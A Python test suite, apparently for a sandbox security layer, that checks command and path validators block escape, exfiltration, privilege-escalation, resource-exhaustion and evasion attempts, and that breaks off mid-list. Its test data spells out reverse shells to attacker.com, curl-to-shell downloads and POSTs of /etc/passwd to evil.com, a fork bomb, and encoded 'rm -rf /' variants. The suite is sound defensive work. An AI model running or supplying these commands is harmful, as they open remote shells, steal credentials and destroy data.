#!/usr/bin/env python3
"""
Comprehensive security and isolation testing suite for the intelligent sandbox system.

This module implements task 10.1: Implement security and isolation testing
- Write sandbox escape prevention tests
- Create network isolation validation tests  
- Implement resource limit enforcement testing
- Write security audit and penetration testing suite

Requirements: 1.3, 9.5
"""

import os
import sys
import time
import tempfile
import shutil
import unittest
import subprocess
import threading
import socket
import psutil
from pathlib import Path
from unittest.mock import Mock, patch, MagicMock
from datetime import datetime, timedelta

# Add the project root to Python path for testing
sys.path.insert(0, str(Path(__file__).parent.parent))

from src.sandbox.intelligent.workspace.security import (
    SecurityPolicy,
    FilesystemSecurityManager,
    CommandSecurityManager,
    ResourceLimitManager,
    NetworkSecurityManager,
    SandboxSecurityManager
)
from src.sandbox.intelligent.workspace.models import SandboxWorkspace, IsolationConfig
from src.sandbox.intelligent.types import WorkspaceStatus


class TestSandboxEscapePrevention(unittest.TestCase):
    """
    Test suite for sandbox escape prevention.
    
    Tests various attack vectors that could be used to escape the sandbox
    and access the host system or other sandboxes.
    """
    
    def setUp(self):
        """Set up test environment with strict security policy."""
        self.policy = SecurityPolicy(
            max_file_size=10 * 1024 * 1024,  # 10MB limit for testing
            allow_network=False,
            max_memory_mb=512,
            max_cpu_percent=25.0,
            max_processes=50
        )
        self.security_manager = SandboxSecurityManager(self.policy)
        
        # Create test workspace
        self.temp_dir = tempfile.mkdtemp(prefix="sandbox_test_")
        self.workspace = SandboxWorkspace(
            id="escape-test-workspace",
            source_path="/tmp/source",
            sandbox_path=self.temp_dir,
            isolation_config=IsolationConfig(use_docker=True),
            created_at=datetime.now(),
            status=WorkspaceStatus.ACTIVE,
            metadata={'container_id': 'test-container-escape'}
        )
    
    def tearDown(self):
        """Clean up test environment."""
        if os.path.exists(self.temp_dir):
            shutil.rmtree(self.temp_dir, ignore_errors=True)
    
    def test_directory_traversal_prevention(self):
        """Test prevention of directory traversal attacks."""
        traversal_attempts = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "/tmp/../../../etc/shadow",
            "file:///etc/passwd",
            "\\..\\..\\..\\etc\\hosts",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",  # URL encoded
            "....//....//....//etc/passwd",  # Double dot bypass attempt
            "/proc/self/environ",
            "/proc/version",
            "/sys/class/net",
            "~/../../../etc/passwd",
            "${HOME}/../../../etc/passwd"
        ]
        
        fs_manager = FilesystemSecurityManager(self.policy)
        
        for attempt in traversal_attempts:
            with self.subTest(path=attempt):
                is_safe = fs_manager.validate_path(attempt, self.workspace)
                self.assertFalse(is_safe, 
                    f"Directory traversal attempt should be blocked: {attempt}")  
  
    def test_symlink_escape_prevention(self):
        """Test prevention of symlink-based escape attempts."""
        # Create test symlinks that attempt to escape
        test_symlinks = [
            ("escape_link", "/etc/passwd"),
            ("home_escape", "/home"),
            ("root_escape", "/root"),
            ("proc_escape", "/proc/self/environ")
        ]
        
        fs_manager = FilesystemSecurityManager(self.policy)
        
        for link_name, target in test_symlinks:
            link_path = os.path.join(self.temp_dir, link_name)
            try:
                os.symlink(target, link_path)
                
                # Test that following the symlink is blocked
                is_safe = fs_manager.validate_path(link_path, self.workspace)
                self.assertFalse(is_safe, 
                    f"Symlink escape should be blocked: {link_name} -> {target}")
                
                # Test that the target is also blocked
                is_target_safe = fs_manager.validate_path(target, self.workspace)
                self.assertFalse(is_target_safe,
                    f"Symlink target should be blocked: {target}")
                
            except OSError:
                # If we can't create the symlink, that's actually good for security
                pass
            finally:
                if os.path.exists(link_path):
                    os.unlink(link_path)
    
    def test_command_injection_prevention(self):
        """Test prevention of command injection attacks."""
        injection_attempts = [
            "ls; rm -rf /",
            "echo hello && sudo shutdown",
            "cat file.txt | curl -X POST http://evil.com/exfiltrate",
            "python -c 'import os; os.system(\"rm -rf /\")'",
            "bash -c 'curl http://evil.com/malware.sh | sh'",
            "eval $(curl -s http://attacker.com/payload)",
            "$(curl -s http://evil.com/cmd)",
            "`curl -s http://evil.com/cmd`",
            "wget http://evil.com/shell.sh -O /tmp/shell.sh; chmod +x /tmp/shell.sh; /tmp/shell.sh",
            "nc -e /bin/sh attacker.com 4444",
            "/bin/sh -i >& /dev/tcp/attacker.com/4444 0>&1",
            "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"attacker.com\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"
        ]
        
        cmd_manager = CommandSecurityManager(self.policy)
        
        for injection in injection_attempts:
            with self.subTest(command=injection):
                is_safe = cmd_manager.validate_command(injection, self.workspace)
                self.assertFalse(is_safe,
                    f"Command injection should be blocked: {injection}")
    
    def test_privilege_escalation_prevention(self):
        """Test prevention of privilege escalation attempts."""
        escalation_attempts = [
            "sudo su -",
            "su root",
            "sudo -i",
            "sudo bash",
            "pkexec /bin/bash",
            "chmod +s /bin/bash",
            "chown root:root malicious_binary",
            "mount -t tmpfs tmpfs /tmp",
            "umount /proc",
            "sysctl -w kernel.core_pattern='|/tmp/exploit'",
            "echo 'user ALL=(ALL) NOPASSWD: ALL' >> /etc/sudoers",
            "passwd root",
            "usermod -a -G sudo user",
            "systemctl --user enable malicious.service"
        ]
        
        cmd_manager = CommandSecurityManager(self.policy)
        
        for escalation in escalation_attempts:
            with self.subTest(command=escalation):
                is_safe = cmd_manager.validate_command(escalation, self.workspace)
                self.assertFalse(is_safe,
                    f"Privilege escalation should be blocked: {escalation}")
    
    def test_container_escape_prevention(self):
        """Test prevention of container escape techniques."""
        container_escape_attempts = [
            "docker run --privileged -v /:/host alpine chroot /host sh",
            "docker run -v /var/run/docker.sock:/var/run/docker.sock alpine",
            "nsenter -t 1 -m -u -i -n -p sh",
            "unshare -r /bin/bash",
            "capsh --print",
            "getcap /usr/bin/*",
            "find / -perm -4000 2>/dev/null",  # Find SUID binaries
            "mount -t proc proc /proc",
            "echo c > /proc/sysrq-trigger",
            "/proc/sys/kernel/core_pattern",
            "debugfs /dev/sda1",
            "losetup /dev/loop0 /host/filesystem.img"
        ]
        
        cmd_manager = CommandSecurityManager(self.policy)
        
        for escape_attempt in container_escape_attempts:
            with self.subTest(command=escape_attempt):
                is_safe = cmd_manager.validate_command(escape_attempt, self.workspace)
                self.assertFalse(is_safe,
                    f"Container escape attempt should be blocked: {escape_attempt}")
    
    def test_file_system_escape_prevention(self):
        """Test prevention of filesystem-based escape attempts."""
        # Test access to sensitive system files
        sensitive_files = [
            "/etc/passwd",
            "/etc/shadow", 
            "/etc/sudoers",
            "/etc/hosts",
            "/etc/fstab",
            "/proc/self/environ",
            "/proc/self/cmdline",
            "/proc/version",
            "/proc/cpuinfo",
            "/proc/meminfo",
            "/sys/class/net",
            "/dev/null",
            "/dev/zero",
            "/dev/random",
            "/dev/urandom",
            "/dev/sda",
            "/dev/sda1",
            "/boot/grub/grub.cfg",
            "/var/log/auth.log",
            "/var/log/syslog",
            "/root/.ssh/id_rsa",
            "/home/user/.ssh/id_rsa"
        ]
        
        fs_manager = FilesystemSecurityManager(self.policy)
        
        for sensitive_file in sensitive_files:
            with self.subTest(file=sensitive_file):
                is_safe = fs_manager.validate_path(sensitive_file, self.workspace)
                self.assertFalse(is_safe,
                    f"Access to sensitive file should be blocked: {sensitive_file}")
    
    def test_process_namespace_isolation(self):
        """Test that process namespace isolation is maintained."""
        # Commands that could reveal host processes
        process_reveal_commands = [
            "ps aux",
            "ps -ef",
            "pstree",
            "top",
            "htop",
            "lsof",
            "netstat -tulpn",
            "ss -tulpn",
            "fuser -v /",
            "pidof init",
            "kill -9 1",  # Try to kill init
            "killall -9 systemd"
        ]
        
        cmd_manager = CommandSecurityManager(self.policy)
        
        # Most of these should be blocked or heavily restricted
        blocked_count = 0
        for cmd in process_reveal_commands:
            is_safe = cmd_manager.validate_command(cmd, self.workspace)
            if not is_safe:
                blocked_count += 1
        
        # At least 70% should be blocked for good isolation
        block_percentage = (blocked_count / len(process_reveal_commands)) * 100
        self.assertGreaterEqual(block_percentage, 70.0,
            f"Expected at least 70% of process reveal commands to be blocked, got {block_percentage:.1f}%")
    
    def test_network_namespace_isolation(self):
        """Test that network namespace isolation prevents host network access."""
        network_commands = [
            "ifconfig",
            "ip addr show",
            "ip route show", 
            "arp -a",
            "netstat -rn",
            "ss -i",
            "iptables -L",
            "nmap localhost",
            "tcpdump -i eth0",
            "wireshark",
            "ettercap"
        ]
        
        cmd_manager = CommandSecurityManager(self.policy)
        
        blocked_count = 0
        for cmd in network_commands:
            is_safe = cmd_manager.validate_command(cmd, self.workspace)
            if not is_safe:
                blocked_count += 1
        
        # Most network commands should be blocked
        block_percentage = (blocked_count / len(network_commands)) * 100
        self.assertGreaterEqual(block_percentage, 60.0,
            f"Expected at least 60% of network commands to be blocked, got {block_percentage:.1f}%")


class TestNetworkIsolationValidation(unittest.TestCase):
    """
    Test suite for network isolation validation.
    
    Tests that network access is properly controlled and isolated.
    """
    
    def setUp(self):
        """Set up test environment with network controls."""
        self.policy_no_network = SecurityPolicy(allow_network=False)
        self.policy_restricted_network = SecurityPolicy(
            allow_network=True,
            allowed_domains={"github.com", "pypi.org"},
            blocked_domains={"malware.com", "evil.com"}
        )
        
        self.network_manager_isolated = NetworkSecurityManager(self.policy_no_network)
        self.network_manager_restricted = NetworkSecurityManager(self.policy_restricted_network)
        
        self.workspace = SandboxWorkspace(
            id="network-test-workspace",
            source_path="/tmp/source",
            sandbox_path="/tmp/sandbox",
            isolation_config=IsolationConfig(use_docker=True),
            created_at=datetime.now(),
            status=WorkspaceStatus.ACTIVE,
            metadata={'container_id': 'test-container-network'}
        )
    
    def test_complete_network_isolation(self):
        """Test complete network isolation when network is disabled."""
        test_hosts = [
            "google.com",
            "github.com", 
            "pypi.org",
            "malware.com",
            "127.0.0.1",
            "localhost",
            "0.0.0.0",
            "::1",
            "192.168.1.1",
            "10.0.0.1",
            "172.16.0.1"
        ]
        
        for host in test_hosts:
            with self.subTest(host=host):
                is_allowed = self.network_manager_isolated.validate_network_access(host)
                self.assertFalse(is_allowed,
                    f"Network access should be blocked when network is disabled: {host}") 
   
    def test_domain_whitelist_enforcement(self):
        """Test that domain whitelist is properly enforced."""
        allowed_domains = ["github.com", "pypi.org"]
        blocked_domains = ["google.com", "facebook.com", "malware.com", "evil.com"]
        
        # Test allowed domains
        for domain in allowed_domains:
            with self.subTest(domain=domain, expected=True):
                is_allowed = self.network_manager_restricted.validate_network_access(domain)
                self.assertTrue(is_allowed,
                    f"Whitelisted domain should be allowed: {domain}")
        
        # Test blocked domains
        for domain in blocked_domains:
            with self.subTest(domain=domain, expected=False):
                is_allowed = self.network_manager_restricted.validate_network_access(domain)
                self.assertFalse(is_allowed,
                    f"Non-whitelisted domain should be blocked: {domain}")
    
    def test_ip_address_blocking(self):
        """Test that direct IP access is properly controlled."""
        dangerous_ips = [
            "127.0.0.1",  # Localhost
            "0.0.0.0",    # All interfaces
            "::1",        # IPv6 localhost
            "169.254.1.1", # Link-local
            "224.0.0.1",  # Multicast
            "255.255.255.255"  # Broadcast
        ]
        
        for ip in dangerous_ips:
            with self.subTest(ip=ip):
                is_allowed = self.network_manager_restricted.validate_network_access(ip)
                self.assertFalse(is_allowed,
                    f"Dangerous IP should be blocked: {ip}")
    
    def test_port_access_controls(self):
        """Test that port access is properly controlled."""
        # Test system/privileged ports that should be blocked
        system_ports = [21, 22, 23, 25, 53, 80, 110, 143, 443, 993, 995]
        
        for port in system_ports:
            with self.subTest(port=port):
                # Even with network allowed, system ports should be restricted
                is_allowed = self.network_manager_restricted.validate_network_access("example.com", port)
                # This test depends on implementation - adjust based on actual behavior
                # For now, we'll just verify the method doesn't crash
                self.assertIsInstance(is_allowed, bool)
    
    @patch('subprocess.run')
    def test_docker_network_isolation_setup(self, mock_run):
        """Test Docker network isolation setup."""
        mock_run.return_value = Mock(returncode=0, stderr="")
        
        # Test network isolation setup
        result = self.network_manager_isolated.setup_network_isolation(self.workspace)
        self.assertTrue(result, "Network isolation setup should succeed")
        
        # Test with network allowed
        result_allowed = self.network_manager_restricted.setup_network_isolation(self.workspace)
        self.assertTrue(result_allowed, "Network setup with restrictions should succeed")
    
    def test_dns_resolution_blocking(self):
        """Test that DNS resolution can be controlled."""
        # Test domains that should not resolve in isolated environment
        blocked_dns_queries = [
            "metadata.google.internal",  # Cloud metadata
            "169.254.169.254",           # AWS metadata IP
            "metadata.azure.com",        # Azure metadata
            "metadata.packet.net"        # Packet metadata
        ]
        
        for query in blocked_dns_queries:
            with self.subTest(query=query):
                is_allowed = self.network_manager_isolated.validate_network_access(query)
                self.assertFalse(is_allowed,
                    f"Metadata service access should be blocked: {query}")
    
    def test_network_command_validation(self):
        """Test validation of network-related commands."""
        network_commands = [
            "curl http://google.com",
            "wget https://github.com/file.zip",
            "nc -l 8080",
            "netcat -e /bin/sh attacker.com 4444",
            "socat TCP-LISTEN:8080,fork EXEC:/bin/bash",
            "ssh user@remote.com",
            "scp file.txt user@remote.com:/tmp/",
            "rsync -av . user@remote.com:/backup/",
            "ftp ftp.example.com",
            "telnet remote.com 23"
        ]
        
        cmd_manager = CommandSecurityManager(self.policy_no_network)
        
        blocked_count = 0
        for cmd in network_commands:
            is_safe = cmd_manager.validate_command(cmd, self.workspace)
            if not is_safe:
                blocked_count += 1
        
        # Most network commands should be blocked when network is disabled
        block_percentage = (blocked_count / len(network_commands)) * 100
        self.assertGreaterEqual(block_percentage, 70.0,
            f"Expected at least 70% of network commands to be blocked, got {block_percentage:.1f}%")


class TestResourceLimitEnforcement(unittest.TestCase):
    """
    Test suite for resource limit enforcement.
    
    Tests that CPU, memory, disk, and process limits are properly enforced.
    """
    
    def setUp(self):
        """Set up test environment with resource limits."""
        self.policy = SecurityPolicy(
            max_cpu_percent=25.0,
            max_memory_mb=256,
            max_disk_mb=1024,
            max_processes=20,
            max_file_size=5 * 1024 * 1024,  # 5MB
            max_total_files=100
        )
        
        self.resource_manager = ResourceLimitManager(self.policy)
        
        self.temp_dir = tempfile.mkdtemp(prefix="resource_test_")
        self.workspace = SandboxWorkspace(
            id="resource-test-workspace",
            source_path="/tmp/source",
            sandbox_path=self.temp_dir,
            isolation_config=IsolationConfig(use_docker=True),
            created_at=datetime.now(),
            status=WorkspaceStatus.ACTIVE,
            metadata={'container_id': 'test-container-resources'}
        )
    
    def tearDown(self):
        """Clean up test environment."""
        if os.path.exists(self.temp_dir):
            shutil.rmtree(self.temp_dir, ignore_errors=True)
    
    @patch('subprocess.run')
    def test_docker_resource_limit_application(self, mock_run):
        """Test application of Docker resource limits."""
        mock_run.return_value = Mock(returncode=0, stderr="")
        
        result = self.resource_manager.apply_resource_limits(self.workspace)
        self.assertTrue(result, "Resource limits should be applied successfully")
        
        # Verify the docker update command was called with correct parameters
        mock_run.assert_called_once()
        call_args = mock_run.call_args[0][0]
        
        self.assertIn('docker', call_args)
        self.assertIn('update', call_args)
        self.assertIn('test-container-resources', call_args)
        self.assertIn('--cpus', call_args)
        self.assertIn('--memory', call_args)
        self.assertIn('--pids-limit', call_args)
    
    @patch('subprocess.run')
    def test_docker_resource_limit_failure_handling(self, mock_run):
        """Test handling of Docker resource limit application failures."""
        mock_run.return_value = Mock(returncode=1, stderr="Container not found")
        
        result = self.resource_manager.apply_resource_limits(self.workspace)
        self.assertFalse(result, "Resource limit application should fail gracefully")
    
    def test_resource_limit_validation_missing_container(self):
        """Test resource limit application with missing container ID."""
        workspace_no_container = SandboxWorkspace(
            id="no-container-workspace",
            source_path="/tmp/source",
            sandbox_path=self.temp_dir,
            isolation_config=IsolationConfig(use_docker=True),
            created_at=datetime.now(),
            status=WorkspaceStatus.ACTIVE,
            metadata={}  # No container_id
        )
        
        result = self.resource_manager.apply_resource_limits(workspace_no_container)
        self.assertFalse(result, "Should fail when container ID is missing")
    
    @patch('subprocess.run')
    def test_resource_monitoring(self, mock_run):
        """Test resource usage monitoring."""
        # Mock docker stats output
        mock_run.return_value = Mock(
            returncode=0,
            stdout="CONTAINER,CPU %,MEM USAGE / LIMIT,PIDS\ntest-container-resources,15.5%,128MB / 256MB,12\n"
        )
        
        stats = self.resource_manager.monitor_resource_usage(self.workspace)
        
        self.assertIn('cpu_percent', stats)
        self.assertIn('memory_usage', stats)
        self.assertIn('processes', stats)
        self.assertIn('container_id', stats)
        self.assertEqual(stats['container_id'], 'test-container-resources')
    
    def test_file_size_limit_enforcement(self):
        """Test enforcement of file size limits."""
        fs_manager = FilesystemSecurityManager(self.policy)
        
        # Create a file that exceeds the size limit
        large_file_path = os.path.join(self.temp_dir, "large_file.txt")
        
        # Mock file size to exceed limit
        with patch('os.path.getsize', return_value=self.policy.max_file_size + 1):
            with patch('os.path.exists', return_value=True):
                is_allowed = fs_manager.validate_file_operation('write', large_file_path, self.workspace)
                self.assertFalse(is_allowed, "Write operation should be blocked for oversized files")
    
    def test_file_count_limit_enforcement(self):
        """Test enforcement of file count limits."""
        fs_manager = FilesystemSecurityManager(self.policy)
        
        # Create files up to the limit
        for i in range(self.policy.max_total_files):
            file_path = os.path.join(self.temp_dir, f"file_{i}.txt")
            with open(file_path, 'w') as f:
                f.write("test content")
        
        # Try to create one more file
        extra_file_path = os.path.join(self.temp_dir, "extra_file.txt")
        is_allowed = fs_manager.validate_file_operation('write', extra_file_path, self.workspace)
        self.assertFalse(is_allowed, "Write operation should be blocked when file limit is exceeded")
    
    def test_cpu_intensive_command_detection(self):
        """Test detection and handling of CPU-intensive commands."""
        cpu_intensive_commands = [
            "stress --cpu 8 --timeout 60s",
            "yes > /dev/null",
            ":(){ :|:& };:",  # Fork bomb
            "while true; do echo 'CPU intensive'; done",
            "dd if=/dev/zero of=/dev/null",
            "openssl speed",
            "hashcat -m 0 -a 3 hash.txt ?a?a?a?a",
            "john --wordlist=rockyou.txt hashes.txt"
        ]
        
        cmd_manager = CommandSecurityManager(self.policy)
        
        blocked_count = 0
        for cmd in cpu_intensive_commands:
            is_safe = cmd_manager.validate_command(cmd, self.workspace)
            if not is_safe:
                blocked_count += 1
        
        # Most CPU-intensive commands should be blocked
        block_percentage = (blocked_count / len(cpu_intensive_commands)) * 100
        self.assertGreaterEqual(block_percentage, 60.0,
            f"Expected at least 60% of CPU-intensive commands to be blocked, got {block_percentage:.1f}%")
    
    def test_memory_intensive_command_detection(self):
        """Test detection and handling of memory-intensive commands."""
        memory_intensive_commands = [
            "stress --vm 1 --vm-bytes 1G --timeout 60s",
            "python -c 'a = [0] * (10**9)'",
            "node -e 'const a = new Array(10**9).fill(0)'",
            "java -Xmx2g MemoryHog",
            "gcc -O0 large_program.c",  # Unoptimized compilation
            "convert large_image.jpg -resize 10000x10000 output.jpg"
        ]
        
        cmd_manager = CommandSecurityManager(self.policy)
        
        # These commands might not all be blocked, but dangerous ones should be
        for cmd in memory_intensive_commands:
            with self.subTest(command=cmd):
                is_safe = cmd_manager.validate_command(cmd, self.workspace)
                # Just verify the validation doesn't crash
                self.assertIsInstance(is_safe, bool)
    
    def test_disk_space_protection(self):
        """Test protection against disk space exhaustion."""
        disk_filling_commands = [
            "dd if=/dev/zero of=bigfile bs=1M count=10000",
            "fallocate -l 10G bigfile",
            "truncate -s 10G bigfile",
            "yes 'A' | head -c 10G > bigfile",
            "tar -czf /dev/stdout /usr | split -b 1G - bigfile",
            "find / -type f -exec cp {} /tmp/sandbox/ \\;"
        ]
        
        cmd_manager = CommandSecurityManager(self.policy)
        
        blocked_count = 0
        for cmd in disk_filling_commands:
            is_safe = cmd_manager.validate_command(cmd, self.workspace)
            if not is_safe:
                blocked_count += 1
        
        # Some disk-filling commands should be blocked
        block_percentage = (blocked_count / len(disk_filling_commands)) * 100
        self.assertGreaterEqual(block_percentage, 40.0,
            f"Expected at least 40% of disk-filling commands to be blocked, got {block_percentage:.1f}%")


class TestSecurityAuditAndPenetrationTesting(unittest.TestCase):
    """
    Security audit and penetration testing suite.
    
    Comprehensive tests that simulate real-world attack scenarios
    and verify the security posture of the sandbox system.
    """
    
    def setUp(self):
        """Set up comprehensive security testing environment."""
        self.policy = SecurityPolicy(
            max_file_size=10 * 1024 * 1024,
            allow_network=False,
            max_memory_mb=512,
            max_cpu_percent=30.0,
            max_processes=50
        )
        
        self.security_manager = SandboxSecurityManager(self.policy)
        
        self.temp_dir = tempfile.mkdtemp(prefix="security_audit_")
        self.workspace = SandboxWorkspace(
            id="security-audit-workspace",
            source_path="/tmp/source",
            sandbox_path=self.temp_dir,
            isolation_config=IsolationConfig(use_docker=True),
            created_at=datetime.now(),
            status=WorkspaceStatus.ACTIVE,
            metadata={'container_id': 'test-container-audit'}
        )
        
        # Track security violations for audit
        self.security_violations = []
    
    def tearDown(self):
        """Clean up test environment."""
        if os.path.exists(self.temp_dir):
            shutil.rmtree(self.temp_dir, ignore_errors=True)
    
    def _log_security_test(self, test_name: str, attack_vector: str, blocked: bool):
        """Log security test results for audit trail."""
        self.security_violations.append({
            'timestamp': datetime.now(),
            'test_name': test_name,
            'attack_vector': attack_vector,
            'blocked': blocked,
            'workspace_id': self.workspace.id
        })
    
    def test_comprehensive_attack_simulation(self):
        """Simulate a comprehensive multi-vector attack."""
        attack_vectors = [
            # File system attacks
            ("file_traversal", "../../../etc/passwd"),
            ("symlink_escape", "/tmp/escape_link -> /etc/shadow"),
            ("device_access", "/dev/sda1"),
            
            # Command injection attacks  
            ("command_injection", "ls; curl http://evil.com/exfiltrate | sh"),
            ("shell_escape", "bash -c 'exec /bin/sh'"),
            ("python_injection", "python -c 'import os; os.system(\"rm -rf /\")'"),
            
            # Privilege escalation
            ("sudo_abuse", "sudo su -"),
            ("suid_exploitation", "find / -perm -4000 -exec {} \\;"),
            ("container_escape", "nsenter -t 1 -m -u -i -n -p sh"),
            
            # Network attacks
            ("reverse_shell", "nc -e /bin/sh attacker.com 4444"),
            ("data_exfiltration", "curl -X POST -d @/etc/passwd http://evil.com/collect"),
            ("dns_tunneling", "nslookup $(cat /etc/passwd | base64).evil.com"),
            
            # Resource exhaustion
            ("fork_bomb", ":(){ :|:& };:"),
            ("disk_fill", "dd if=/dev/zero of=bigfile bs=1M count=10000"),
            ("memory_bomb", "python -c 'a = [0] * (10**9)'"),
            
            # Process manipulation
            ("process_injection", "gdb -p 1 -ex 'call system(\"sh\")' -ex quit"),
            ("signal_abuse", "kill -9 1"),
            ("proc_manipulation", "echo 'malicious' > /proc/sys/kernel/core_pattern")
        ]
        
        blocked_attacks = 0
        total_attacks = len(attack_vectors)
        
        for attack_type, attack_payload in attack_vectors:
            with self.subTest(attack=attack_type):
                if attack_type.startswith("file_") or attack_type == "device_access":
                    # File system attack
                    is_blocked = not self.security_manager.filesystem_manager.validate_path(
                        attack_payload.split(" -> ")[0], self.workspace)
                elif attack_type.endswith("_injection") or attack_type.endswith("_escape") or \
                     attack_type.endswith("_abuse") or attack_type.endswith("_exploitation") or \
                     attack_type.endswith("_shell") or attack_type.endswith("_exfiltration") or \
                     attack_type.endswith("_tunneling") or attack_type.endswith("_bomb") or \
                     attack_type.endswith("_manipulation") or attack_type.endswith("_abuse"):
                    # Command-based attack
                    is_blocked = not self.security_manager.command_manager.validate_command(
                        attack_payload, self.workspace)
                else:
                    # Default to command validation
                    is_blocked = not self.security_manager.command_manager.validate_command(
                        attack_payload, self.workspace)
                
                if is_blocked:
                    blocked_attacks += 1
                
                self._log_security_test("comprehensive_attack_simulation", 
                                      f"{attack_type}: {attack_payload}", is_blocked)
        
        # Calculate security effectiveness
        security_effectiveness = (blocked_attacks / total_attacks) * 100
        
        print(f"\nSecurity Audit Results:")
        print(f"Total attack vectors tested: {total_attacks}")
        print(f"Attacks blocked: {blocked_attacks}")
        print(f"Security effectiveness: {security_effectiveness:.1f}%")
        
        # We expect at least 80% of attacks to be blocked
        self.assertGreaterEqual(security_effectiveness, 80.0,
            f"Security effectiveness should be at least 80%, got {security_effectiveness:.1f}%")
    
    def test_advanced_evasion_techniques(self):
        """Test advanced evasion techniques that attackers might use."""
        evasion_techniques = [
            # Encoding evasion
            ("base64_encoding", "echo 'cm0gLXJmIC8=' | base64 -d | sh"),
            ("hex_encoding", "echo '726d202d7266202f' | xxd -r -p | sh"),
            ("url_encoding", "python -c 'import urllib.parse; exec(urllib.parse.unquote(\"%72%6d%20%2d%72%66%20%2f\"))'"),
            
            # Obfuscation
            ("variable_substitution", "CMD='rm -rf /'; $CMD"),
            ("string_concatenation", "python -c 'exec(\"r\"+\"m \"+\"-rf /\")'"),
            ("whitespace_evasion", "rm\t-rf\n/"),
            
            # Indirect execution
            ("file_execution", "echo 'rm -rf /' > /tmp/evil.sh; chmod +x /tmp/evil.sh; /tmp/evil.sh"),
            ("interpreter_abuse", "python -c 'exec(open(\"/tmp/evil.py\").read())'"),
            ("eval_abuse", "eval $(echo 'rm -rf /')"),
            
            # Time-based evasion
            ("delayed_execution", "sleep 1; rm -rf /"),
            ("background_execution", "nohup rm -rf / &"),
            ("cron_abuse", "echo '* * * * * rm -rf /' | crontab -"),
            
            # Process hiding
            ("process_renaming", "exec -a innocent_name rm -rf /"),
            ("subshell_hiding", "(rm -rf /) 2>/dev/null"),
            ("redirection_hiding", "rm -rf / >/dev/null 2>&1")
        ]
        
        cmd_manager = CommandSecurityManager(self.policy)
        
        blocked_evasions = 0
        for evasion_type, evasion_payload in evasion_techniques:
            with self.subTest(evasion=evasion_type):
                is_blocked = not cmd_manager.validate_command(evasion_payload, self.workspace)
                if is_blocked:
                    blocked_evasions += 1
                
                self._log_security_test("advanced_evasion_techniques",
                                      f"{evasion_type}: {evasion_payload}", is_blocked)
        
        evasion_block_rate = (blocked_evasions / len(evasion_techniques)) * 100
        print(f"Evasion techniques blocked: {blocked_evasions}/{len(evasion_techniques)} ({evasion_block_rate:.1f}%)")
        
        # We expect at least 70% of evasion techniques to be detected and blocked
        self.assertGreaterEqual(evasion_block_rate, 70.0,
            f"Expected at least 70% of evasion techniques to be blocked, got {evasion_block_rate:.1f}%")
    
    def test_multi_stage_attack_prevention(self):
        """Test prevention of multi-stage attacks that build up over time."""
        # Simulate a multi-stage attack scenario
        attack_stages = [
            ("reconnaissance", "uname -a; id; whoami; pwd"),
            ("enumeration", "find / -writable 2>/dev/null"),
            ("payload_download", "curl http://evil.com/payload.sh -o /tmp/payload.sh"),
            ("payload_execution", "chmod +x /tmp/payload.sh; /tmp/payload.sh"),
            ("persistence", "echo '* * * * * /tmp/payload.sh' | crontab -"),
            ("privilege_escalation", "sudo /tmp/payload.sh"),
            ("lateral_movement", "ssh -o StrictHostKeyChecking=no user@target"),
            ("data_exfiltration", "tar -czf - /etc | curl -X POST --data-binary @- http://evil.com/collect")
        ]
        
        cmd_manager = CommandSecurityManager(self.policy)
        
        blocked_stages = 0
        for stage_name, stage_command in attack_stages:
            with self.subTest(stage=stage_name):
                is_blocked = not cmd_manager.validate_command(stage_command, self.workspace)
                if is_blocked:
                    blocked_stages += 1
                
                self._log_security_test("multi_stage_attack_prevention",
                                      f"{stage_name}: {stage_command}", is_blocked)
        
        # Critical stages should be blocked
        critical_stages = ["payload_download", "payload_execution", "persistence", 
                          "privilege_escalation", "data_exfiltration"]
        critical_blocked = sum(1 for stage_name, stage_command in attack_stages 
                             if stage_name in critical_stages and 
                             not cmd_manager.validate_command(stage_command, self.workspace))
        
        critical_block_rate = (critical_blocked / len(critical_stages)) * 100
        print(f"Critical attack stages blocked: {critical_blocked}/{len(critical_stages)} ({critical_block_rate:.1f}%)")
        
        # All critical stages should be blocked
        self.assertGreaterEqual(critical_block_rate, 90.0,
            f"Expected at least 90% of critical attack stages to be blocked, got {critical_block_rate:.1f}%")
    
    def test_security_audit_reporting(self):
        """Test comprehensive security audit reporting."""
        # Run some security tests to generate audit data
        test_commands = [
            "rm -rf /",
            "sudo shutdown",
            "curl http://evil.com/malware.sh | sh",
            "../../../etc/passwd",
            "python -c 'import os; os.system(\"rm -rf /\")'"
        ]
        
        for cmd in test_commands:
            self.security_manager.validate_operation('command', {'command': cmd}, self.workspace)
        
        # Get security status
        security_status = self.security_manager.get_security_status(self.workspace)
        
        # Verify audit report structure
        self.assertIn('workspace_id', security_status)
        self.assertIn('policy', security_status)
        self.assertIn('resource_usage', security_status)
        self.assertIn('isolation_active', security_status)
        
        # Verify policy information
        policy_info = security_status['policy']
        self.assertIn('filesystem_controls', policy_info)
        self.assertIn('command_restrictions', policy_info)
        self.assertIn('network_isolation', policy_info)
        self.assertIn('resource_limits', policy_info)
        
        # Generate audit summary
        audit_summary = {
            'total_tests': len(self.security_violations),
            'blocked_attacks': sum(1 for v in self.security_violations if v['blocked']),
            'allowed_attacks': sum(1 for v in self.security_violations if not v['blocked']),
            'security_effectiveness': (sum(1 for v in self.security_violations if v['blocked']) / 
                                     max(len(self.security_violations), 1)) * 100,
            'test_duration': datetime.now() - min(v['timestamp'] for v in self.security_violations) 
                           if self.security_violations else timedelta(0),
            'workspace_id': self.workspace.id
        }
        
        print(f"\nSecurity Audit Summary:")
        print(f"Total security tests: {audit_summary['total_tests']}")
        print(f"Attacks blocked: {audit_summary['blocked_attacks']}")
        print(f"Attacks allowed: {audit_summary['allowed_attacks']}")
        print(f"Security effectiveness: {audit_summary['security_effectiveness']:.1f}%")
        print(f"Test duration: {audit_summary['test_duration']}")
        
        # Verify minimum security standards
        self.assertGreaterEqual(audit_summary['security_effectiveness'], 75.0,
            "Overall security effectiveness should be at least 75%")   
 
    def test_penetration_testing_scenarios(self):
        """Test realistic penetration testing scenarios."""
        # Common penetration testing payloads
        pentest_payloads = [
            # Web application attacks
            ("sql_injection", "'; DROP TABLE users; --"),
            ("xss_payload", "<script>alert('XSS')</script>"),
            ("command_injection_web", "; cat /etc/passwd"),
            
